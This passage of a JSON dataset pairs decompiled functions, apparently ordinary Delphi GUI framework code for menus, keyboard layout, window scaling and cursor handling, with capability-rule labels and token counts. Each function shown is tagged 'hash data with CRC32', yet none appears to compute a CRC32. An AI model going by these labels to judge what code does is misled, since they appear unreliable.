        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00436fd4(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint pwszKLID;\n    uint var_ch;\n    uint hLibModule;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x437107;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    pwszKLID._0_1_ = 0;\n    puStack56 = &fcn.00436fd4::pwszKLID;\n    puStack60 = 0x437001;\n    sub.user32.dll_GetKeyboardLayoutNameA();\n    puStack60 = 0x43700d;\n    var_ch = fcn.00420f38();\n    uStack64 = 0x4370dd;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x43702b;\n    puStack60 = &stack0xfffffffc;\n    fcn.00421014();\n    puStack72 = 0x43703b;\n    fcn.004056dc();\n    puStack72 = 0x43704b;\n    fcn.00405784();\n    puStack72 = 0x437056;\n    fcn.0042127c();\n    puStack72 = 0x437066;\n    fcn.004218dc();\n    puStack72 = 0x437073;\n    uVar1 = fcn.0040f984();\n    uStack76 = 0x4370c0;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    hLibModule = uVar1;\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1, 0x437164);\n    iVar3 = (*pcVar2)();\n    *0x4914d0 = (*(iVar3 + 0x28) & 1) == 1;\n    *in_FS_OFFSET = uVar1;\n    uStack80 = 0x4370c7;\n    sub.kernel32.dll_FreeLibrary_1(hLibModule);\n    return;\n}\n",
        "token_count": 609
    },
    "00437520": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437520(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint hMenu;\n    \n    iVar1 = sub.user32.dll_GetMenuItemCount();\n    puVar2 = arg_8h + -0x200;\n    iVar4 = 0;\n    while ((iVar4 < iVar1 && (puVar2 < arg_8h + -5))) {\n        fcn.00437b28(0x400, (arg_8h + -5) - puVar2, puVar2);\n        puVar2 = fcn.0040a87c();\n        uVar3 = sub.user32.dll_GetMenuState();\n        if ((uVar3 & 2) != 0) {\n            *puVar2 = 0x24;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 0x40) != 0) {\n            *puVar2 = 0x40;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        if ((uVar3 & 1) != 0) {\n            *puVar2 = 0x23;\n            puVar2 = puVar2 + 1;\n            *puVar2 = 0;\n        }\n        *puVar2 = 0x3b;\n        puVar2 = puVar2 + 1;\n        *puVar2 = 0;\n        iVar4 = iVar4 + 1;\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004385c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004385c4(uint arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint var_15h;\n    uint var_4h;\n    \n    if ((**0x492734 < 5) && ((**0x492734 != 4 || (**0x492998 < 1)))) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    fcn.0040483c();\n    cVar2 = fcn.004047cc();\n    if (((arg_8h & 1) == 0) || ((cVar2 != '\\0' && ((cVar2 == '\\0' || (bVar1)))))) {\n        if ((bVar1) && ((arg_8h & 0x80) != 0)) {\n            fcn.0042482c();\n            fcn.00423f70();\n        }\n        else {\n            fcn.0042482c();\n            fcn.00423f70();\n        }\n    }\n    else {\n        fcn.0042482c();\n        fcn.00423f70();\n    }\n    (**(*in_EAX + 0x30))(cVar2, arg_8h);\n    return;\n}\n",
        "token_count": 287
    },
    "0043b010": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint8_t fcn.0043b010(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint8_t uVar2;\n    \n    uVar2 = *0x43b064;\n    if ((in_EAX & 4) != 0) {\n        uVar2 = *0x43b064 | 1;\n    }\n    if ((in_EAX & 8) != 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 1) != 0) {\n        uVar2 = uVar2 | 8;\n    }\n    if ((in_EAX & 2) != 0) {\n        uVar2 = uVar2 | 0x10;\n    }\n    if ((in_EAX & 0x10) != 0) {\n        uVar2 = uVar2 | 0x20;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x12);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "0043c318": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c318(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_1 != param_2) {\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            *(*(in_EAX + 0x250) + 0x1e) = 1;\n            *(*(in_EAX + 0x254) + 0x1e) = 1;\n        }\n        fcn.0043ba34();\n        fcn.0043ba34();\n        if (*(in_EAX + 600) == '\\0') {\n            if (*(*(in_EAX + 0x250) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x250) + 0x10), param_2, param_1);\n                fcn.0043bb84();\n            }\n            if (*(*(in_EAX + 0x254) + 0x1e) != '\\0') {\n                sub.kernel32.dll_MulDiv(*(*(in_EAX + 0x254) + 0x10), param_2, param_1);\n                fcn.0043bb84();\n            }\n        }\n    }\n    *(*(in_EAX + 0x250) + 0x1e) = 0;\n    *(*(in_EAX + 0x254) + 0x1e) = 0;\n    return;\n}\n",
        "token_count": 343
    },
    "0043d824": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d824(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x358) & 1) == 0) {\n        if ((param_2 != '\\0') && (param_2 != *(in_EAX + 0x57))) {\n            fcn.0043f20c();\n        }\n        fcn.0044fbe4();\n    }\n    else {\n        if (param_2 == '\\0') {\n            *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xfd;\n            return;\n        }\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 2;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0043fee8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fee8(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43ff98;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x0043ff82;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x0043ff5b;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x0043ff3a:\n        puStack24 = puVar1;\n        fcn.004075f4();\n        fcn.0040da70();\n        fcn.00404eb4();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.0043b164();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x0043ff3a;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.0040483c();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x0043ff3a;\n        }\n    }\ncode_r0x0043ff5b:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.004402bc();\n        }\n        fcn.0040483c();\n    }\ncode_r0x0043ff82:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43ff9f;\n    uStack28 = 0x43ff97;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 573
    },
    "00440974": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440974(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (((*(*(arg_8h + -4) + 0x271) != '\\0') && ((*(*(arg_8h + -4) + 0x270) & 1) != 0)) &&\n       (*(*(arg_8h + -4) + 0x277) != '\\x01')) {\n        uVar1 = fcn.00457a28(0);\n        uVar1 = sub.user32.dll_GetSystemMenu(uVar1);\n        if (*(*(arg_8h + -4) + 0x271) == '\\x03') {\n            sub.user32.dll_DeleteMenu(uVar1, 0xf130, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 7, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 5, 0x400);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf030, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf020, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf000, 0);\n            sub.user32.dll_DeleteMenu(uVar1, 0xf120, 0);\n        }\n        else {\n            if ((*(*(arg_8h + -4) + 0x270) & 2) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf020, 1);\n            }\n            if ((*(*(arg_8h + -4) + 0x270) & 4) == 0) {\n                sub.user32.dll_EnableMenuItem(uVar1, 0xf030, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "004429c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004429c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044f354();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff | param_2 << 0x10;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043eff8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00442a04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00442a04(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n        fcn.0044f388();\n    }\n    else {\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) & 0xffff0000 | param_2 & 0xffff;\n        if (((*(in_EAX + 0x1c) & 1) == 0) && (*(in_EAX + 0x278) != '\\x03')) {\n            fcn.0043eff8();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00442aac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00442af5)\n// WARNING: Removing unreachable block (ram,0x00442b15)\n// WARNING: Removing unreachable block (ram,0x00442b1e)\n// WARNING: Removing unreachable block (ram,0x00442b23)\n// WARNING: Removing unreachable block (ram,0x00442b30)\n// WARNING: Removing unreachable block (ram,0x00442b35)\n// WARNING: Removing unreachable block (ram,0x00442b42)\n\nvoid fcn.00442aac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x442b8c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.004563dc();\n    if (iVar1 == 1) {\n        fcn.0044fc34();\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.0044fc44();\n        fcn.0044fcf4();\n    }\n    fcn.00456240();\n    fcn.0044f048();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.0043d824();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x442b93;\n    uStack32 = 0x442b8b;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 398
    },
    "00442f4c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00442f4c(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint auStack40 [7];\n    uint8_t uStack12;\n    \n    auStack40[0] = 0x28;\n    uVar1 = (***0x492724)(*(in_EAX + 4), auStack40);\n    return uVar1 & 0xffffff00 | (uStack12 & 1) != 0;\n}\n",
        "token_count": 109
    },
    "0044edbc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044edbc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x61)) {\n        cVar1 = *(in_EAX + 0x61);\n        *(in_EAX + 0x61) = param_2;\n        if ((*(in_EAX + 7) & 1) == 0) {\n            if (((*0x44ee58 == cVar1) || (*0x44ee58 != *(in_EAX + 0x61))) ||\n               ((in_EAX[0x60] == in_EAX[0x10] &&\n                (((in_EAX[0x61] == in_EAX[0x11] && (in_EAX[0x62] == in_EAX[0x12])) && (in_EAX[99] == in_EAX[0x13]))))))\n            {\n                fcn.0044f1d0();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 270
    },
    "0044ee5c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ee5c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00404640();\n        *(in_EAX + 0x6c) = 0;\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) & 0xffff7fff;\n    }\n    else {\n        *(in_EAX + 0x50) = *(in_EAX + 0x50) | 0x8000;\n        if (*(in_EAX + 0x6c) == 0) {\n            iVar1 = fcn.0040483c();\n            uVar2 = (**(iVar1 + 0x14))();\n            *(in_EAX + 0x6c) = uVar2;\n        }\n        (**(**(in_EAX + 0x6c) + 0xc))();\n        iVar1 = *(in_EAX + 0x6c);\n        *(iVar1 + 0xc) = in_EAX;\n        *(iVar1 + 8) = 0x45233c;\n        fcn.0040483c();\n        fcn.0041f90c();\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "0044f048": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f048(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = *(in_EAX + 0x5b);\n    if (param_2 != cVar1) {\n        *(in_EAX + 0x5b) = param_2;\n        fcn.0044edbc();\n        if (((*(in_EAX + 7) & 1) == 0) &&\n           (((((*(in_EAX + 7) & 0x10) == 0 || (in_EAX[0xc] != 0)) && (param_2 != '\\x06')) && (cVar1 != '\\x06')))) {\n            if ((((cVar1 - 1U < 2 == param_2 - 3U < 2) && (cVar1 != '\\0')) && (cVar1 != '\\x05')) &&\n               ((param_2 != '\\0' && (param_2 != '\\x05')))) {\n                (**(*in_EAX + 0x88))(in_EAX[0x12], in_EAX[0x13]);\n            }\n            else if ((cVar1 == '\\0') || (param_2 != '\\0')) {\n                fcn.0040483c();\n            }\n            else {\n                (**(*in_EAX + 0x88))(in_EAX[99], in_EAX[0x62]);\n            }\n        }\n    }\n    (**(*in_EAX + 0x5c))();\n    return;\n}\n",
        "token_count": 348
    },
    "0044f130": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044f130(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    cVar1 = fcn.004519c0();\n    if ((cVar1 != '\\0') &&\n       ((((in_EDX != in_EAX[0x10] || (in_ECX != in_EAX[0x11])) || (arg_ch != in_EAX[0x12])) || (arg_8h != in_EAX[0x13]))\n       )) {\n        fcn.0045011c();\n        in_EAX[0x10] = in_EDX;\n        in_EAX[0x11] = in_ECX;\n        in_EAX[0x12] = arg_ch;\n        in_EAX[0x13] = arg_8h;\n        fcn.0044f1d0();\n        fcn.0045285c();\n        (**(*in_EAX + 0x80))();\n        fcn.00450f7c(0);\n        (**(*in_EAX + 0x5c))();\n        if ((*(in_EAX + 7) & 1) == 0) {\n            fcn.0040483c();\n        }\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0044f1d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044f1d0(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack20;\n    uint uStack16;\n    \n    if ((*(in_EAX + 0x164) == '\\0') && ((*(in_EAX + 0x1c) & 1) == 0)) {\n        uVar1 = *(in_EAX + 0x61);\n        iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n        uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n        iVar4 = uVar3 >> 1;\n        if (iVar4 < 0) {\n            iVar4 = iVar4 + ((uVar3 & 1) != 0);\n        }\n        (**(**(in_EAX + 0x78) + 0x10))(iVar2 + iVar4);\n        (**(**(in_EAX + 0x78) + 0x10))();\n        fcn.00418360();\n        *(in_EAX + 0x16d) = uStack20;\n        *(in_EAX + 0x171) = uStack16;\n        if (*0x44f350 == uVar1) {\n            *(in_EAX + 0x175) = 0;\n            *(in_EAX + 0x179) = 0;\n        }\n        else {\n            if ((uVar1 & 4) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x165) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 1) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x165) = uVar5;\n            }\n            if ((uVar1 & 8) == 0) {\n                iVar2 = (**(**(in_EAX + 0x78) + 0x10))();\n                uVar3 = (**(**(in_EAX + 0x78) + 0x10))();\n                iVar4 = uVar3 >> 1;\n                if (iVar4 < 0) {\n                    iVar4 = iVar4 + ((uVar3 & 1) != 0);\n                }\n                *(in_EAX + 0x169) = iVar2 + iVar4;\n            }\n            else if ((uVar1 & 2) == 0) {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            else {\n                uVar5 = (**(**(in_EAX + 0x78) + 0x10))();\n                *(in_EAX + 0x169) = uVar5;\n            }\n            if (*(in_EAX + 0x30) != NULL) {\n                (**(**(in_EAX + 0x30) + 0xd0))();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 849
    },
    "0044f5ac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f5ac(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 1;\n    }\n    *(in_EAX + 0x160) = param_2;\n    return;\n}\n",
        "token_count": 92
    },
    "0044f5c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044f5c0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        *(in_EAX + 0x158) = 0;\n    }\n    fcn.004054c0();\n    return;\n}\n",
        "token_count": 76
    },
    "0044f8cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f8cc(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int32_t in_stack_ffffffd4;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    \n    if (param_2 != param_1) {\n        uVar2 = *0x44fa80;\n        if ((*(in_EAX + 7) & 1) != 0) {\n            uVar2 = *(in_EAX + 0x23);\n        }\n        if ((uVar2 & 1) != 0) {\n            in_stack_ffffffd4 = in_EAX[0x10];\n            in_stack_ffffffdc = param_1;\n            sub.kernel32.dll_MulDiv(in_stack_ffffffd4, param_2, param_1);\n        }\n        if ((uVar2 & 2) != 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n        }\n        if (((uVar2 & 4) == 0) || ((*(in_EAX + 0x51) & 1) != 0)) {\n            in_stack_ffffffdc = in_EAX[0x12];\n        }\n        else if ((uVar2 & 1) == 0) {\n            sub.kernel32.dll_MulDiv(in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        else {\n            sub.kernel32.dll_MulDiv(in_EAX[0x10] + in_EAX[0x12], param_2, in_stack_ffffffd4);\n        }\n        bVar3 = (uVar2 & 8) == 0;\n        if ((bVar3) || ((*(in_EAX + 0x51) & 2) != 0)) {\n            iStack32 = in_EAX[0x13];\n        }\n        else {\n            iStack32 = param_1;\n            if (bVar3) {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11], param_2, in_stack_ffffffd4);\n            }\n            else {\n                sub.kernel32.dll_MulDiv(in_EAX[0x11] + in_EAX[0x13], param_2, in_stack_ffffffd4);\n            }\n        }\n        fcn.0044f780();\n        (**(*in_EAX + 0x88))(iStack32, in_stack_ffffffdc);\n        if (*0x44fa88 != (uVar2 & *0x44fa84)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x175), param_2, iStack32);\n            *(in_EAX + 0x175) = uVar1;\n        }\n        if (*0x44fa88 != (uVar2 & *0x44fa8c)) {\n            uVar1 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x179), param_2, iStack32);\n            *(in_EAX + 0x179) = uVar1;\n        }\n        if ((*(in_EAX + 0x59) == '\\0') && ((uVar2 & 0x10) != 0)) {\n            uVar1 = fcn.004242b4(param_2, iStack32);\n            sub.kernel32.dll_MulDiv(uVar1);\n            fcn.004242d0();\n        }\n    }\n    *(in_EAX + 0x23) = *0x44fa88;\n    return;\n}\n",
        "token_count": 821
    },
    "0044faac": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.0044faac(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uchar *puVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44fb42;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puVar3 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x50) & 0x20) != 0) && (uVar5 = (*(in_EAX + 0x1c) & 1) == 0,  puVar3 = &stack0xfffffffc,  uVar5)) {\n        fcn.0044fcc4();\n        fcn.00405894();\n        puVar3 = puStack28;\n        if (uVar5) {\n            iVar1 = *(in_EAX + 4);\n            if (iVar1 != 0) {\n                cVar4 = fcn.004047cc();\n                if ((cVar4 != '\\0') && (puVar3 = puStack28,  (*(iVar1 + 0x1c) & 1) != 0)) goto code_r0x0044fb0e;\n            }\n            bVar2 = true;\n            goto code_r0x0044fb14;\n        }\n    }\ncode_r0x0044fb0e:\n    puStack28 = puVar3;\n    bVar2 = false;\ncode_r0x0044fb14:\n    fcn.0041fda8();\n    if (bVar2) {\n        fcn.0044fcf4();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x44fb49;\n    uStack32 = 0x44fb41;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 468
    },
    "0044ff3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ff3c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = fcn.00419834();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1cc) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.004196cc();\n                fcn.00419854();\n                fcn.0045011c();\n                if ((*(in_EAX + 0x1c) & 1) == 0) {\n                    iVar2 = fcn.0043b1b8();\n                    if ((*(iVar2 + 0x54) & 4) != 0) {\n                        fcn.0040483c();\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "00450400": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00450400(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    cVar1 = fcn.0045c9d4();\n    if (cVar1 != '\\0') {\n        fcn.0045ca94();\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x8f) != '\\x01')) {\n        fcn.0040db2c();\n        fcn.00404eb4();\n    }\n    fcn.00450fb0();\n    if ((*0x497c78 == 0) || (*0x497c78 == -1)) {\n        *0x497c78 = 0;\n        if ((*(in_EAX + 0x54) & 1) != 0) {\n            sub.user32.dll_GetCursorPos(&iStack32);\n            fcn.0044f804();\n            iStack32 = iStack20;\n            uStack28 = uStack24 & 0xffff | iStack20 << 0x10;\n            fcn.00450f7c(uStack28);\n        }\n        if (*0x497c78 != -1) {\n            fcn.0044dc94();\n        }\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00451d84": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451d84(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + -0x10))();\n    if (*0x451e30 == (*0x451e2c & *(in_EAX + 7))) {\n        iVar1 = in_EAX[0x1d];\n        if ((*(iVar1 + 0xc) == 0) || (in_EAX[0x12] <= *(iVar1 + 0xc))) {\n            if ((*(iVar1 + 0x14) != 0) && (in_EAX[0x12] < *(iVar1 + 0x14))) {\n                *(iVar1 + 0x14) = in_EAX[0x12];\n            }\n        }\n        else {\n            *(iVar1 + 0xc) = in_EAX[0x12];\n        }\n        if ((*(iVar1 + 8) == 0) || (in_EAX[0x13] <= *(iVar1 + 8))) {\n            if ((*(iVar1 + 0x10) != 0) && (in_EAX[0x13] < *(iVar1 + 0x10))) {\n                *(iVar1 + 0x10) = in_EAX[0x13];\n            }\n        }\n        else {\n            *(iVar1 + 8) = in_EAX[0x13];\n        }\n        iVar1 = *(param_2 + 8);\n        if ((((iVar1 != 0) && (in_EAX[0x25] != 0)) && ((*(in_EAX + 0x55) & 4) == 0)) &&\n           ((((*(iVar1 + 0x18) & 1) == 0 && (*(iVar1 + 0x10) != 0)) && (*(iVar1 + 0x14) != 0)))) {\n            fcn.00450fb0();\n        }\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "00452d04": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
